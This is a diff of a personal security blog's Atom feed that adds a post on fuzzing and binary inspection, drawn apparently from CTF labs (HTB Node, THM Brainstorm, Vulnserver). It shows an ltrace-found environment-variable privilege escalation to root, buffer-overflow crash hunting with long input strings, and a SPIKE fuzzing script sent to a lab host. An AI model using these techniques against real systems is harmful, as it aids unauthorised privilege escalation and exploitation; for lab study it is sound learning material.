@@ -4,13 +4,142 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-21T18:10:49+08:00</updated>
+ <updated>2022-04-24T18:01:14+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Fuzzing and Binary Inspection Techniques</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/24/fuzzing-and-binary-inspection-techniques"/>
+   <updated>2022-04-24T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/24/Fuzzing-and-Binary-Inspection-Techniques</id>
+   <content type="html">&lt;h2 id=&quot;system-and-library-calls&quot;&gt;System and Library Calls&lt;/h2&gt;
+&lt;p&gt;Its helpful to always see what system and library calls the binary is performing.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# You can see what files, directories, or libraries it&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# is accessing&lt;/span&gt;
+ltrace ./myapp 
+
+&lt;span class=&quot;c&quot;&gt;# check system calls&lt;/span&gt;
+strace /usr/bin/myapp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I experience this scenario when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; - It appeared that in order to escalate my privileges, I just need to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin=1&lt;/code&gt; based from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; output..&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@blog:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace /usr/sbin/checker
+getenv&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; nil
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Not an Admin&quot;&lt;/span&gt;Not an Admin
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 13
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+www-data@blog:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+www-data@blog:/var/www/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checker
+root@blog:/var/www/wordpress# &lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+root@blog:/var/www/wordpress#  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;segmentation-fault-point&quot;&gt;Segmentation Fault Point&lt;/h2&gt;
+&lt;p&gt;Before finding the instruction pointer offset, you need to find where is the point of the program where buffer overflow occurs. One example is to do an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ltrace&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./backup a a &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print(&quot;A&quot;*1000)&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+strcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xffbb0081, &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffbb0081
+strcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xffbb008d, &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffbb008d
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+strstr&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;&lt;/span&gt;..., &lt;span class=&quot;s2&quot;&gt;&quot;/etc&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+strcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xff9020ac, &lt;span class=&quot;s2&quot;&gt;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGSEGV &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Segmentation fault&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
++++ killed by SIGSEGV +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Based from the output above, it looks like it segfaulted on the last instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; right after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strstr&lt;/code&gt;. We can now go inside gdb and examine the assembly layout and find the last instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+0x080489d4 &amp;lt;+22&amp;gt;:	call   0x8048670 &amp;lt;strcpy@plt&amp;gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once we find it out, we can now add a breakpoint on that location. This is just an example, there might be better ways to do this like for example, if you use peda, it will automatically stopped at the buffer overflow point.&lt;/p&gt;
+
+&lt;h2 id=&quot;parameters-detection&quot;&gt;Parameters Detection&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Some custom binaries might not tell you what parameters it can accept such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/backup&lt;/code&gt; from HTB Node. You can find out the parameters it accept in different ways.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Find readable strings&lt;/span&gt;
+stirngs /usr/local/bin/backuop
+
+&lt;span class=&quot;c&quot;&gt;# Increment the parameters until you get an output&lt;/span&gt;
+/usr/local/bin/backup a
+/usr/local/bin/backup a a
+/usr/local/bin/backup a a a
+
+&lt;span class=&quot;c&quot;&gt;# Increment with fuzzer&lt;/span&gt;
+/usr/local/bin/backup &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print(&apos;A&apos;*1000)&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+/usr/local/bin/backup a &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print(&apos;A&apos;*1000)&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+/usr/local/bin/backup a a &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print(&apos;A&apos;*1000)&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;manual&quot;&gt;Manual&lt;/h2&gt;
+&lt;p&gt;Here is an example for THM room brainstorm.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Generate buffer in python&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# use the output
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# use the output
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Use the output above on name and message inputs&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Please enter your username &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;max 20 characters&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
+Write a message: &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;See where will the program crashed&lt;/li&gt;
+  &lt;li&gt;Once you determine on what input the program crashed, you can now use scripts (e.g python) to continue in finding the offset, eip, etc ..&lt;/li&gt;
+  &lt;li&gt;::NOTE:: I tried fuzzing name input and it crashed at 15000 bytes buffer which is too much! This is most likely wrong so if you encounter this, try fuzzing other input. One indication if this is wrong is when you generate pattern in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; but the EIP offset cannnot be found.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;spiking&quot;&gt;Spiking&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Here is an example for Vulnserver&lt;/li&gt;
+  &lt;li&gt;Create spike script&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# file: trun.spk&lt;/span&gt;
+s_readline&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+s_string&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;TRUN &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+s_string_variable&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Execute spike against target&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;generic_send_tcp 192.168.18.33 9999 trun.spk 0 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Other resources
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;https://resources.infosecinstitute.com/topic/intro-to-fuzzing/&quot;&gt;An introduction to fuzzing: using fuzzers (SPIKE) to find vulnerabilities - Infosec Resources&lt;/a&gt; —&amp;gt; see also powerpoint included&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Android APK Command Injection via msfvenom template</title>
